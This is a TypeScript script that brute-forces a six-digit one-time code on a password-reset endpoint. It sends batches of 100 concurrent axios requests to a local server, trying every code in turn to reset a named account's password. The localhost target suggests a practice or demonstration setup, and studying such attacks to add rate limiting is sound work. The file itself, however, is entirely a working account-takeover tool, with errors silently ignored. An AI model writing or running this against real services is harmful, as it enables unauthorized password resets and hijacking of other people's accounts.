import axios from "axios";

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "al@gmail.com",
    otp: otp,
    newPassword: "2004",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3001/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    await axios.request(config);
  } catch (error) {}
}

async function main() {
  for (let i = 99999; i <= 999999; i += 100) {
    const p = [];
    console.log(i);
    for (let j = 0; j < 100; j++) {
      p.push(sendRequest((i + j).toString()));
    }
    await Promise.all(p);
  }
}

main();
